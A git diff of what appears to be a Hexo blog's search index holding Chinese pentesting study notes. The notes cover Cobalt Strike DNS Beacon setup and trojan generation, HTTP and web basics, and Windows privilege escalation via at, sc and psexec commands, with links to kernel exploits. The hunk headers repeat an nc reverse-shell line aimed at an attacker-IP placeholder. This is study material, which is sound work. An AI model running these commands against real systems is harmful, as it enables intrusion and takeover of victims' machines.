+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructue_beacon-dns.htm#_Toc65482740">https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructue_beacon-dns.htm#_Toc65482740</a></p>
+<p><a href="https://www.secpulse.com/archives/124454.html">Cobalt Strike｜Beacon原理浅析</a></p>
+<p><a href="https://www.cnblogs.com/EndlessShw/p/15521355.html">Cobalt Strike DNS Beacon 的使用和原理</a></p>
+<h4 id="什么是Beacon"><a href="#什么是Beacon" class="headerlink" title="什么是Beacon"></a>什么是Beacon</h4><p><strong>Beacon是Cobalt Strike运行在目标主机上的payload</strong>，Beacon在隐蔽信道上我们提供服务，用于长期控制受感染主机。它的工作方式与Metasploit Framework Payload类似。在实际渗透过程中，我<strong>们可以将其嵌入到可执行文件、添加到Word文档或者通过利用主机漏洞来传递Beacon</strong>。</p>
+<p>Beacon的功能包括以下几点：</p>
+<ol>
+<li><p>使用HTTP或DNS检查是否有待执行任务</p>
+</li>
+<li><p>可连接到多个C2域名</p>
+</li>
+<li><p>能够在分段传输后自动迁移</p>
+</li>
+<li><p>与Cobalt Strike紧密集成，通过社工、主机漏洞和会话来传递Beacon</p>
+</li>
+</ol>
+<p>Beacon的中文名为信标，像是在网络中告诉我们：“嘿，我是肉鸡，我在这…”。我们可以通过下图来看<strong>Beacon的工作原理</strong>：</p>
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328155752894.png" alt="image-20220328155752894"></p>
+<h4 id="DNS-Beacon-的工作过程"><a href="#DNS-Beacon-的工作过程" class="headerlink" title="DNS Beacon 的工作过程"></a>DNS Beacon 的工作过程</h4><p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328155601467.png" alt="image-20220328155601467"></p>
+<p>当受害者请求域名对应的ip地址时（通过 shell 或者 钓鱼），会从根域名DNS服务器，一级域名DNS服务器，二级域名DNS服务器…依次向下寻找，直到我们的团队服务器，同时充当DNS服务器，将Beacon返回给团队服务器。DNS响应告诉Beacon休眠或者连接到团队服务器来下载任务。<strong>DNS响应同时也告诉Beacon如何从团队服务器下载任务</strong>。</p>
+<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="配置监听器"><a href="#配置监听器" class="headerlink" title="配置监听器"></a>配置监听器</h4><blockquote>
+<p>需要买一个域名修改解析记录如下：</p>
+<p>记录类型-&gt;主机记录-&gt;记录值</p>
+<p>A记录-&gt;cs主机名-&gt;CS服务器IP</p>
+<p>NS记录-&gt;ns1主机名-&gt;A记录地址</p>
+<p>NS记录-&gt;ns2主机名-&gt;A记录地址</p>
+</blockquote>
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328220713776.png" alt="image-20220328220713776"></p>
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220327223518224.png" alt="image-20220327223518224"></p>
+<p>这里遇到了坑，创建不了监听器</p>
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/FWJ7%7D6NY36CFOIL2F5KJM.png" alt="img"></p>
+<p>一直说地址被占用，搞了好久，发现是我VPS的53端口被占用了，关掉就好了</p>
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328125213095.png" alt="image-20220328125213095"></p>
+<p>很奇怪的是，我和赵师傅都有这个进程，他就能创，我却不能，就很玄学。问了黄师傅说是有些服务有关联性，有的服务运行有优先级啥的，也说不准，只能说盲猜QAQ</p>
+<h4 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h4><blockquote>
+<p>Windows Executable 　　　　　生成32位或64位的exe和基于服务的exe、DLL等后门程序</p>
+<p>Windows Executable(S)　　　　用于生成一个exe可执行文件，其中包含Beacon的完整payload，不需要阶段性的请求。与Windows Executable模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持powershell脚本，可用于将Stageless Payload注入内存</p>
+</blockquote>
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328143931880.png" alt="image-20220328143931880"></p>
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328143953671.png" alt="image-20220328143953671"></p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>当受害者主机运行我们的木马后，便会有一个<strong>unknown</strong>主机上线</p>
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328144156493.png" alt="image-20220328144156493"></p>
+<p>interact进去后，输入如下命令进行配置</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">beacon&gt; checkin</span><br><span class="line"><span class="selector-attr">[*]</span> Tasked beacon <span class="selector-tag">to</span> checkin</span><br><span class="line">beacon&gt; mode dns-txt</span><br><span class="line"><span class="selector-attr">[+]</span> data channel set <span class="selector-tag">to</span> DNS-TXT</span><br><span class="line"><span class="selector-attr">[+]</span> host called home, sent: <span class="number">8</span> bytes</span><br></pre></td></tr></table></figure>
+
+<p>出现如下图的样子，就说明受害主机真正成功上线</p>
+<p>接下来就可以执行命令了</p>
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328145736619.png" alt="image-20220328145736619"></p>
+<p>这里还遇到另外一个坑，就是当时弄的时候用的学校的网络，导致输入命令没有回显，换了手机热点就行了，真的吐了🤮</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/weixin_28744573/article/details/116581837">关闭linux系统的53端口</a></p>
+<p><a href="https://blog.csdn.net/qq_43645782/article/details/121416056">Linux systemd-resolve占用53端口的解决方法</a></p>
+<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><a href="http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip">portmap+lcx.exe下载</a></p>
 ]]></content>
       <categories>
-        <category>小迪安全-Web渗透测试笔记</category>
+        <category>内网安全</category>
       </categories>
       <tags>
         <tag>渗透测试</tag>
+        <tag>内网安全</tag>
       </tags>
   </entry>
   <entry>
@@ -2696,6 +2640,102 @@ nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
       <tags>
         <tag>渗透测试</tag>
         <tag>内网安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基础入门</title>
+    <url>/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<p>基础入门</p>
+<span id="more"></span>
+<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><h3 id="Host和DNS的关系"><a href="#Host和DNS的关系" class="headerlink" title="Host和DNS的关系"></a>Host和DNS的关系</h3><h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2><h3 id="常见脚本语言"><a href="#常见脚本语言" class="headerlink" title="常见脚本语言"></a>常见脚本语言</h3><p>asp <strong>php</strong> aspx jsp <strong>javaweb</strong> pl <strong>py</strong> cgi</p>
+<h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>免杀</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p>网站源码：分脚本类型、应用方向</p>
+<p>操作系统：windows、linux</p>
+<p>中间件（搭建平台）：apache、iis、tomcat、nginx</p>
+<p>数据库：access、mysql、mssql、oracle、sybase、db2、postsql</p>
+<p>​    </p>
+<h2 id="web安全相关漏洞"><a href="#web安全相关漏洞" class="headerlink" title="web安全相关漏洞"></a>web安全相关漏洞</h2><h3 id="web源码类对应漏洞"><a href="#web源码类对应漏洞" class="headerlink" title="web源码类对应漏洞"></a>web源码类对应漏洞</h3><p>SQL注入，文件上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化</p>
+<h3 id="web中间件对应漏洞"><a href="#web中间件对应漏洞" class="headerlink" title="web中间件对应漏洞"></a>web中间件对应漏洞</h3><h3 id="web数据库对应漏洞"><a href="#web数据库对应漏洞" class="headerlink" title="web数据库对应漏洞"></a>web数据库对应漏洞</h3><h3 id="web系统层对应漏洞"><a href="#web系统层对应漏洞" class="headerlink" title="web系统层对应漏洞"></a>web系统层对应漏洞</h3><p>提权</p>
+<h3 id="其他第三方漏洞"><a href="#其他第三方漏洞" class="headerlink" title="其他第三方漏洞"></a>其他第三方漏洞</h3><h3 id="APP或PC应用结合类"><a href="#APP或PC应用结合类" class="headerlink" title="APP或PC应用结合类"></a>APP或PC应用结合类</h3><p>有些app是网页套壳，可以通过工具逆向出相关网页，进行web攻击</p>
+<h2 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h2><h3 id="http与https"><a href="#http与https" class="headerlink" title="http与https"></a>http与https</h3><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E6%95%B0%E6%8D%AE%E5%8C%851.jpg" alt="数据包1"></p>
+<h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><p>建立连接-&gt;发送请求数据包-&gt;返回响应数据包-&gt;关闭连接</p>
+<h4 id="https"><a href="#https" class="headerlink" title="https"></a>https</h4><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E6%95%B0%E6%8D%AE%E5%8C%852.JPG" alt="数据包2"></p>
+<h3 id="Request请求数据包"><a href="#Request请求数据包" class="headerlink" title="Request请求数据包"></a>Request请求数据包</h3><h4 id="请求行：请求类型-请求资源路径、协议的版本和类型"><a href="#请求行：请求类型-请求资源路径、协议的版本和类型" class="headerlink" title="请求行：请求类型/请求资源路径、协议的版本和类型"></a>请求行：请求类型/请求资源路径、协议的版本和类型</h4><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E8%A1%8C.png" alt="请求行"></p>
+<p>用burp改包成POST传参时，需要添加<code>Content-Type: application/x-www-form-urlencoded</code>，并且空一行填入参数值</p>
+<h4 id="请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义"><a href="#请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义" class="headerlink" title="请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义"></a>请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义</h4><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E5%A4%B4-1.png" alt="请求头-1"></p>
+<p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E5%A4%B4-2.png" alt="请求头-2"></p>
+<p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E5%A4%B4-3.png" alt="请求头-3"></p>
+<h4 id="空行：请求头与请求实体之间用一个空行隔开"><a href="#空行：请求头与请求实体之间用一个空行隔开" class="headerlink" title="空行：请求头与请求实体之间用一个空行隔开"></a>空行：请求头与请求实体之间用一个空行隔开</h4><p>最后一个请求头标之后，发送回车符和退行，通知服务器以下不再有头标</p>
+<h4 id="请求体：请求体：要发送的数据（一般post提交会使用），例如：user-123-amp-pass-123"><a href="#请求体：请求体：要发送的数据（一般post提交会使用），例如：user-123-amp-pass-123" class="headerlink" title="请求体：请求体：要发送的数据（一般post提交会使用），例如：user=123&amp;pass=123"></a>请求体：请求体：要发送的数据（一般post提交会使用），例如：user=123&amp;pass=123</h4><p>使用POST传送，最常使用的是Content-Type和Content-Length头标</p>
+<h3 id="Response响应数据包"><a href="#Response响应数据包" class="headerlink" title="Response响应数据包"></a>Response响应数据包</h3><h4 id="状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔"><a href="#状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔" class="headerlink" title="状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔"></a>状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔</h4><h5 id="HTTP响应码"><a href="#HTTP响应码" class="headerlink" title="HTTP响应码"></a>HTTP响应码</h5><p>1xx    信息，请求收到，继续处理</p>
+<p>2xx    成功，行为被成功地执行</p>
+<p>3xx    重定向，为了完成请求，必须进一步执行的动作</p>
+<p>4xx    客户端错误</p>
+<p>5xx    服务端错误</p>
+<p>200    存在文件</p>
+<p>403    存在文件夹</p>
+<p>3xx    均可能存在</p>
+<p>404    不存在文件及文件夹</p>
+<p>500    均可能存在</p>
+<h4 id="响应头标：包含服务器类型、日期、长度、内容类型等"><a href="#响应头标：包含服务器类型、日期、长度、内容类型等" class="headerlink" title="响应头标：包含服务器类型、日期、长度、内容类型等"></a>响应头标：包含服务器类型、日期、长度、内容类型等</h4><p>和请求头标一样，它们指出服务器的功能，标识出相应的细节</p>
+<h4 id="空行响应头与响应体之间用空行隔开"><a href="#空行响应头与响应体之间用空行隔开" class="headerlink" title="空行响应头与响应体之间用空行隔开"></a>空行响应头与响应体之间用空行隔开</h4><p>最后一个响应头标之后是一个空行，发送回车符和退行，通知服务器以下不再有头标</p>
+<h4 id="响应数据：浏览器会将实体内容中的数据取出来，生成相应页面"><a href="#响应数据：浏览器会将实体内容中的数据取出来，生成相应页面" class="headerlink" title="响应数据：浏览器会将实体内容中的数据取出来，生成相应页面"></a>响应数据：浏览器会将实体内容中的数据取出来，生成相应页面</h4><p>HTML文档和图像等，也就是HTML本身</p>
+<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/web%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF.png" alt="web攻击思路"></p>
+<p>ASP，PHP，ASPX，JSP，JAVAWEB等脚本类型源码安全问题</p>
+<p>社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</p>
+<p>开源，为开源问题，框架（找框架漏洞）非框架（找代码漏洞）问题，关于CMS（开源程序，能在网上找到源码，可在网上查找这些开源代码的漏洞）识别问题及后续等</p>
+<h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF.png" alt="渗透思路"></p>
+<h2 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h2><p>判断系统：在URL中替换大小写，win下不区分，liunx下区分</p>
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>ASP+Access</p>
+<p>php+mysql</p>
+<p>aspx+mssql</p>
+<p>jsp+mssql,oracle</p>
+<p>python+mongodb</p>
+<h3 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h3><p>mysql    3306</p>
+<p>oracle    1521</p>
+<p>sqlsever    1433</p>
+<h2 id="加密编码算法"><a href="#加密编码算法" class="headerlink" title="加密编码算法"></a>加密编码算法</h2><p>实际应用URL地址参数加密</p>
+<p>搜索特定关键字加密字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inurl:id=MQ==</span><br><span class="line">MQ==是BASE64编码的1</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>小迪安全-Web渗透测试笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网站权限后台漏洞获取</title>
+    <url>/2022/03/01/%E6%8F%90%E6%9D%83%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96/</url>
+    <content><![CDATA[<p><img src="/2022/03/01/%E6%8F%90%E6%9D%83%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96/.png" alt="png"></p>
+<p>具体有哪些权限需要掌握</p>
+<ul>
+<li><p>后台权限：（获得方式：爆破，注入猜解，弱口令等获取的账号密码配合登录）</p>
+<p>一般网站或后台只能操作应用的界面内容数据图片等信息，无法操作程序的源代码或服务器上的资源文件（如后台功能存在文件操作的话也可以操作文件数据）</p>
+</li>
+<li><p>网站权限：（获得方式：以上三种思路获取）</p>
+<p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备</p>
+</li>
+<li><p>数据库权限：<br>操作数据库的权限，数据库的增删改等，源码或配置文件泄露，也可能是网站权限（webshell）进行的数据库配置文件读取获得</p>
+</li>
+<li><p>接口权限：（邮件，短信，支付，第三方登录）</p>
+<p>后台或网站权限后的获取途径了后台（修改配置信息功能点），网站权限（查看配置文件获取）</p>
+</li>
+<li><p>系统权限</p>
+</li>
+<li><p>域控权限</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>权限提升</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
@@ -2973,37 +3013,6 @@ nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
       </tags>
   </entry>
   <entry>
-    <title>网站权限后台漏洞获取</title>
-    <url>/2022/03/01/%E6%8F%90%E6%9D%83%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96/</url>
-    <content><![CDATA[<p><img src="/2022/03/01/%E6%8F%90%E6%9D%83%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96/.png" alt="png"></p>
-<p>具体有哪些权限需要掌握</p>
-<ul>
-<li><p>后台权限：（获得方式：爆破，注入猜解，弱口令等获取的账号密码配合登录）</p>
-<p>一般网站或后台只能操作应用的界面内容数据图片等信息，无法操作程序的源代码或服务器上的资源文件（如后台功能存在文件操作的话也可以操作文件数据）</p>
-</li>
-<li><p>网站权限：（获得方式：以上三种思路获取）</p>
-<p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备</p>
-</li>
-<li><p>数据库权限：<br>操作数据库的权限，数据库的增删改等，源码或配置文件泄露，也可能是网站权限（webshell）进行的数据库配置文件读取获得</p>
-</li>
-<li><p>接口权限：（邮件，短信，支付，第三方登录）</p>
-<p>后台或网站权限后的获取途径了后台（修改配置信息功能点），网站权限（查看配置文件获取）</p>
-</li>
-<li><p>系统权限</p>
-</li>
-<li><p>域控权限</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>权限提升</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Linux定时任务&amp;环境变量&amp;数据库</title>
     <url>/2022/03/05/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&amp;%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&amp;%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
     <content><![CDATA[<p><a href="https://www.freebuf.com/articles/system/173903.html">在Linux中使用环境变量进行提权</a></p>
@@ -3224,14 +3233,42 @@ nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
       </tags>
   </entry>
   <entry>
-    <title>Redis&amp;Postgre</title>
-    <url>/2022/03/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Redis&amp;Postgre/</url>
-    <content><![CDATA[<p><img src="/2022/03/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Redis&Postgre/image-20220303221213861.png" alt="image-20220303221213861"></p>
-<p><img src="/2022/03/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Redis&Postgre/image-20220303232856998.png" alt="image-20220303232856998"></p>
-<p><a href="https://www.jianshu.com/p/fd7b422d5f93">简述关系型数据库和非关系型数据库</a></p>
-<p><a href="https://blog.csdn.net/fly_hps/article/details/80937837">Redis未授权访问漏洞利用总结</a></p>
-<p><a href="https://vulhub.org/#/environments/postgres/CVE-2018-1058/">https://vulhub.org/#/environments/postgres/CVE-2018-1058/</a></p>
-<p><a href="https://vulhub.org/#/environments/postgres/CVE-2019-9193/">https://vulhub.org/#/environments/postgres/CVE-2019-9193/</a></p>
+    <title>Win溢出漏洞及AT&amp;SC&amp;PS提权</title>
+    <url>/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&amp;SC&amp;PS%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220228235230607.png" alt="image-20220228235230607"></p>
+<h2 id="知识必备点"><a href="#知识必备点" class="headerlink" title="知识必备点"></a>知识必备点</h2><p>用户及用户组权限划分</p>
+<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220228235812582.png" alt="image-20220228235812582"></p>
+<p>Windows提权命令</p>
+<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220228235539073.png" alt="image-20220228235539073"></p>
+<h2 id="如何判断哪种溢出漏洞，漏洞哪里找"><a href="#如何判断哪种溢出漏洞，漏洞哪里找" class="headerlink" title="如何判断哪种溢出漏洞，漏洞哪里找"></a>如何判断哪种溢出漏洞，漏洞哪里找</h2><p>流程：信息搜集-&gt;补丁筛选-&gt;利用msf或特定exp执行-&gt;提权成功</p>
+<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>一开始使用systeminfo查看当前系统信息，获取补丁编号</p>
+<h3 id="补丁筛选"><a href="#补丁筛选" class="headerlink" title="补丁筛选"></a>补丁筛选</h3><p>vulmap，Wes，WindowsVulnScan工具（后两个好用）</p>
+<p>对于vulmap来说，web很难能执行.ps1文件，所以webshell实用性不佳</p>
+<p>Wes和WindowsVulnScan，本质是比较windows系统版本、systeminfo补丁信息来查看漏洞利用情况。</p>
+<p>这里注意WindowsVulnScan， 也需要执行一个.sp1的文件，但这个文件其实也就是和systeminfo做的相同的工作，只是生成了一个KB.json文件，我们可以自行在webshell里执行systeminfo然后改成和KB.json里一样的格式，然后在本机用该工具对改好的KB.json扫描，若扫描时报错可能是KB.json文件编码有问题，需要改成UTF-8</p>
+<p><a href="https://www.cnblogs.com/bonelee/p/15863223.html">WindowsVulnScan和Wes用法</a></p>
+<p>wes检测语句：python wes.py systeminfo.txt -o vuln.csv</p>
+<p>根据vuln.csv中获取exp链接地址</p>
+<h2 id="AT-amp-SC-amp-PS提权"><a href="#AT-amp-SC-amp-PS提权" class="headerlink" title="AT&amp;SC&amp;PS提权"></a>AT&amp;SC&amp;PS提权</h2><h3 id="at提权"><a href="#at提权" class="headerlink" title="at提权"></a>at提权</h3><p>适用版本：Win2000 &amp; Win2003 &amp; XP中还是存在的，在Win7以后被剔除</p>
+<p>payload：<code>at (时间) /interactive cmd.exe</code></p>
+<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220301235011222.png" alt="image-20220301235011222"></p>
+<h3 id="sc提权"><a href="#sc提权" class="headerlink" title="sc提权"></a>sc提权</h3><p>win2003测试成功,win7未测试成功</p>
+<p>创建一个名叫syscmd的新的交互式的cmd执行服务</p>
+<p><code>sc Create syscmdd binPath= &quot;cmd /K start&quot; type= own type= interact</code></p>
+<p>运行服务</p>
+<p><code>sc start syscmdd</code></p>
+<p><img src="/2022/03/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/image-20220301235056001.png" alt="image-20220301235056001"></p>
+<h3 id="PS提权"><a href="#PS提权" class="headerlink" title="PS提权"></a>PS提权</h3><p>适用版本：<code>Win2003 &amp; Win2008</code></p>
+<p>需要下载PsTools（windows官方软件不会被杀）</p>
+<p>payload：<code>psexec.exe -accepteula -s -i -d cmd.exe</code></p>
+<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><a href="https://github.com/vulmon/Vulmap">https://github.com/vulmon/Vulmap</a></p>
+<p><a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p>
+<p><a href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a></p>
+<p>win内核漏洞exp收录：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+<p><a href="https://www.shuzhiduo.com/A/A7zgDNYKJ4/">云服务器上安装msf以及msf初体验</a></p>
+<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
+<p><a href="https://github.com/unamer/CVE-2018-8120">https://github.com/unamer/CVE-2018-8120</a></p>
+<p><a href="https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWs-VERSION/releases/tag/1">CVE-2020-0787-EXP-ALL-WINDOWS-VERSION</a></p>
 ]]></content>
       <categories>
         <category>权限提升</category>
@@ -3239,7 +3276,7 @@ nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
       <tags>
         <tag>渗透测试</tag>
         <tag>提权</tag>
-        <tag>数据库提权</tag>
+        <tag>win</tag>
       </tags>
   </entry>
   <entry>
@@ -3351,53 +3388,6 @@ nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
       </tags>
   </entry>
   <entry>
-    <title>Win溢出漏洞及AT&amp;SC&amp;PS提权</title>
